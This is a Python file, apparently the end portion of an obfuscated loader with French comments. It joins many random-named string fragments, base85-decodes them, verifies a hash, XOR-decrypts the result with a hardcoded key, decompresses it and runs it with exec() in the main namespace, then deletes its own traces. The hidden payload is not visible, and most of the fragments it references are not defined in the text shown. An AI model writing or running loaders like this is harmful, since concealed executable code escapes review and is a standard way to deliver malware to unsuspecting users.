_cg97FdhTDrf8QO = 'qAXkhE9pogeU%b*f$PL8wrR0Q|iw*&@|x2LeS|0W?8^Il~'
_ct3E0kuCHvQxbb = '-%)kzbHT#Q;l`I(!*HtrAvK2G_SSvXG|wDKkL%<GDjZP#^'
_ctMjZgd8pnUD15 = '-Bna4t{*RGfN_#S8j26SD33lB~S3w>GVrteY$0Am8SC`nc'
_cu_TvTUxjiKfoq = 'MugT1`2Q$8r<mr&h(@CK->*exsn1;clE>GY^7j+*OBC*Ls'
_cpd3AzkbzHw1E4 = '{)+_MhFRxj?T6DJQ!6#@uy+>Id*6{Hc{u+zQggZbl>fLIg'
_csDhtYXs_eMpOx = 'yIIeRG9Zlp5W&mN7Dy_ZQMN&=1EmO|s8QjFJZFRI1r{IG>'
_cpLOKY3iD9BgyC = 'IK_wNDo&Bj;5EZ2sPXlK$}H706LxN^!gHxu16k1rk3%<Fl'
_cqNhM2nOQHCJUu = '08Q`~PB~X|kyq`@liXUF*HYNhZMYctW6@&;YJp<Uk?DS#^'
_caVOfvIrzbWnlc = '@5$vWO0Et)L}2+!D*Xrf'

_pr_RNIrrOeCExJ = __import__('base64').b85decode(_cvsWY3ghxLBTUp + _cnumDXPKV8FJ9m + _cnsWrZDT4ojwfm + _cpH72K6hVnXJ96 + _cuvvU1oUzSPo52 + _crtmSF3Ld5bHYb + _cjLyT7cKPEiHcU + _caSRRp9w3HkJDg + _ceak9EQ45_w7R1 + _cmKndhWtNkebBP + _ccQznx7zxZYu3b + _czC05r_RqjO5fS + _cwH_eP5mNQFgcf + _chzjBdD4N7vegX + _cbwBIX6Tw3WKoR + _cqEtvBPyzRqBAW + _cartdwetv4UKnN + _ctfqf4HID_TC_b + _cv4Nzhs3NiiFpA + _cgQAyMf4PSpCva + _cwfnZJiqDx7iAS + _cynyqw58EthUc_ + _czSzM8RuFS2hic + _cr4da82w9ELMwP + _cavL35yaLI_pvK + _cfH3UjhTaLkItM + _ccaFsvM8NBwlNu + _cbP899NEf37MA2 + _cn6n1U_DlNWAQr + _clHyf4PwJm70Pt + _cftyNhhuRlTrE0 + _cx10g5rL28tPu5 + _crVPsUbH3MY4_C + _cqw3_mxGSRtZ34 + _cntNZ4iUQdgPfR + _cd9GQZLIczHaXm + _cq6szYHFqo5HP4 + _cklg_9BvDp1VH4 + _cpipWuakXv17Uw + _cjjPMaqlDTfPRA + _ct276YNVLhlc4L + _cikqMpVwBGtJvc + _ciodP3u5h95uv2 + _ctS4oG8HamV8QT + _cmCYK93aQSI3gO + _czhphqRroTkw76 + _cp5WRAiz4uVii6 + _ciVHOcsFgtPCs5 + _chxwsvXuRkNgwg + _cvvSEe8_1gLCXz + _cwTYtmLXaNIwT1 + _cm8y4BvZfDNatF + _cpzGZpszqWcRTz + _ctV9WjQNF6hbHw + _chlKAXXMl3Otbn + _caL3X6_Ljp6wxH + _cfMTqrmau09ccV + _cohRmRi2zoTP1b + _cjZWdcKbf_Q3fJ + _cq2ZK3f4emJ8H_ + _ctufs1ou9bM6D_ + _cdY8OA8XT2uKJt + _cot09Qj_kUEAka + _cz_YajshkPGPxC + _crjmkQusgUVMRw + _cerJBnoYbidgoy + _cj925dcT4QrzB0 + _ciGShqVE8T5odK + _ced55mtvWN0T0A + _cjggz2Oq1jaXMp + _cxr8yh0leG_Gih + _ctkDBxMflGULWP + _crvCRFXXcJ_UJ2 + _cut9m_jHARFXay + _crfcb1CshTl96R + _ctCTU7BFJAWxne + _cwqvX0JM95iIyR + _cc0_F6IjEBYOCE + _cbaCHLDxOJkknF + _ct21fsTxPYcQFJ + _cue323lEKygvCb + _cyZZ72dgSGy2s9 + _cewfjHAiy5UqFw + _cpEvAB3cpxe0kU + _cl_7ptzT3x6Mjr + _ceOzqVifALjOGR + _cniNFZZdqBHNUA + _cozL0QwjUJCcLD + _cgzWfZUfYoivh9 + _coS1_q21Q0mft_ + _cwPpxoVWhPfr9c + _cw1YpAZG9gkO5w + _cbZCJA_EuCLaUs + _chl9IFsIatlNwL + _cwxEpYSlnZ7pSx + _cy1tfGxuCc3Tgq + _ccrJeKKP6JRfxD + _c_sORnMTTkn3jz + _cihgzysruFDRzK + _ck28kF9CqUKMxR + _coGATbjPy2Xbvw + _cki7k7Yk0s5Int + _csIM79UV6ZA1a0 + _cqaKWhAE81yTqw + _cka_8BZ6kHSVRc + _cjWnnnBGmICbzP + _cbqBzOJQ59aOjW + _cotMyelkktsiNP + _cjQEp3xPOevggd + _cfcEg2_E36BwOc + _cfj2sNqnM1IF2j + _czuA4m3U6pcXWZ + _c_jVli6Bo53tPU + _canWC_GBvZaZSo + _crp1KLDy2lNfXk + _ctEUDWK3ganuEY + _cw81gH0RzsyRmj + _cfEtrBQQwnth6o + _cuDYq37ZpIpYqR + _coNRb4fcJhrG8D + _cdFAfNaSF6byW0 + _cjaIOyILOBm6cy + _cyhP2IzMsyXlRZ + _cr6s8e9qdamCbN + _cbcX6oytHlDpCh + _cr2gkiNCRRdnvE + _cqwE7TT32nwZdu + _cvq9CQJNSzrAbi + _cgaVihz09Xy37X + _cf9wzxKT1rS5ev + _c__vMXvPZSt_JL + _czWYUKqsW11_ha + _cnDByfS9fa1B_i + _czPnXA4MlP4BgZ + _cvviVLoXWrnQ0D + _cr64DA5C9EtLW_ + _cqqF9K1f6j6Ixt + _ckLd7BTwTCvbhy + _cjyyx33qVHbBVo + _cxRUS9RAu3mKwI + _cqhfWtYfgY4lux + _clT84bhURrOmhb + _cnGmsaPqN3rmWT + _cxYaNSxA3KAX6J + _cgs3dARInu09Yp + _cvMvGWBaZy18_O + _caeussHNb1dFf_ + _cgrwhO3DJHSCM1 + _cizJyiCks87gSV + _caM9hAgF0EG2U6 + _cmpbbZ66dgDewX + _cjX7OhYcjTXSmp + _cc135vEt2ikMEn + _ccPiMLG9UFQ8X3 + _c_EZQJX27pdsTQ + _c_5TRF3q5FvGrE + _cfoH4y_KCTk88k + _ci7TcmDHv7o5VN + _cfF_9Y59AAwovo + _cpqOvI_DaRU0EC + _cmfz6f52ta_LRr + _ctovJ3fW43Gaap + _ccAhD0RWe_UxTO + _cxvcocC9raxaUL + _cuP9xZrSbQYYGy + _ctf2ZFibDFKGkP + _cyrC1EBVjHyxzu + _cro0pLVCF8aDCa + _cqby52HAShf8rM + _cokYlJx5HUsY28 + _cn067LK8DARptE + _cexHTMg66Jc3PT + _ctOWqbqBBYfsOx + _ckV6C9Di8o_uJW + _cas7T2bezaOPFM + _ceHge3rsQMKAr7 + _cd71VXCmIW5kLJ + _cjJmek5UyUPl_K + _cyj3cdO8iNZXFc + _ci8vFK01c16T8u + _crprowyDEkkFMH + _cdqp9djbe6I0hV + _cqKOY7bgNFFTiO + _cljjc6mu3fhEwg + _cxsrB_QKcvs7OE + _cqn2Kxhv4lfn4H + _cdGvqIofBSk5ny + _cvm5Rpfu_Aigic + _coTsKnxSTCCIQT + _cnjp8nSVcciIls + _cqBZxi16b2a9fP + _cp2PQzdxjnCzZr + _cebMA35Us8sSAm + _cdfRxWW8xOMEJQ + _chKFuh7ExVJyk9 + _ckP_yerSBEJ3Ow + _cgm_Zs0kSZwkAE + _ctGB5qKNFigejB + _caXLgRYxU1Qd9H + _cqcnxGgBJl9Wo6 + _chK_9tbAiOuAFg + _crdEs_BlPfAGYh + _cgPNi031gRkAyP + _c_QgUDWEoVaqhg + _cet4xhVRNo5zDT + _ckO3hFVJKK5Xh2 + _cw03q_0CPESs8j + _cdcXahpTIfqbs6 + _cxOU6FBYIGJ1KW + _cjMlmgFN6WBd0W + _cvGGNid_AHZc1q + _coaJRLii448WeF + _cw7hHRbj9xQq1Q + _cecPfjfHtQiLp9 + _cl95KYKcHfwHKo + _caNp7_AII_fc85 + _ce854NgqbtmGwq + _ce65EDv9hh1NDc + _cjZy9SW5ZX8CPG + _ctj27V18hVcIyX + _crMfdBg0MMXxuh + _cn9rTeyzJepTBk + _cg97FdhTDrf8QO + _ct3E0kuCHvQxbb + _ctMjZgd8pnUD15 + _cu_TvTUxjiKfoq + _cpd3AzkbzHw1E4 + _csDhtYXs_eMpOx + _cpLOKY3iD9BgyC + _cqNhM2nOQHCJUu + _caVOfvIrzbWnlc)
if __import__('hashlib').sha256(_pr_RNIrrOeCExJ).hexdigest() != 'ab67ae56e899b3cad9277783b3269a591148e0aac976af34794b50b5795d2c58':
    __import__('sys').exit(1)
_xwulVYfOg0cENX = bytes([179, 185, 6, 117, 227, 11, 245, 222, 202, 231, 39, 220, 207, 240, 49, 201, 1, 48, 46, 140, 202, 49, 225, 58])
_fkblnpmh5G1vyay = bytes([14, 150, 40, 165, 127, 127, 49, 39, 1, 57, 36, 91, 6, 51, 117, 28, 234, 58, 112, 85, 200, 234, 27, 142])

def _fxvwlAkQ70qrCKC(_bwt6cNFlufp74c, _klvt60v5pGR3QP):
    return bytes(_bwt6cNFlufp74c[_i__NncFsNW8ToP] ^ _klvt60v5pGR3QP[_i__NncFsNW8ToP % len(_klvt60v5pGR3QP)] for _i__NncFsNW8ToP in range(len(_bwt6cNFlufp74c)))

def _fdyTfk1g1kszKBe(_trYwyXbuTCS9a9):
    import zlib
    return zlib.decompress(_trYwyXbuTCS9a9) # Un seul niveau de zlib ici pour simplifier

def _fehM1etAYQHsMZx():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xs6Z9D_wPrEfuc = _fxvwlAkQ70qrCKC(_pr_RNIrrOeCExJ, _xwulVYfOg0cENX)
    # 2. Décompression Zlib
    _dqVRNh0rcoFgiN = _fdyTfk1g1kszKBe(_xs6Z9D_wPrEfuc)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dqVRNh0rcoFgiN.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nzpy9qM7rzJIX0 = _main.__dict__
    _nzpy9qM7rzJIX0.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nzpy9qM7rzJIX0)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fehM1etAYQHsMZx()
try:
    del _fxvwlAkQ70qrCKC, _fdyTfk1g1kszKBe, _fehM1etAYQHsMZx
    del _pr_RNIrrOeCExJ, _xwulVYfOg0cENX, _fkblnpmh5G1vyay
except:
    pass
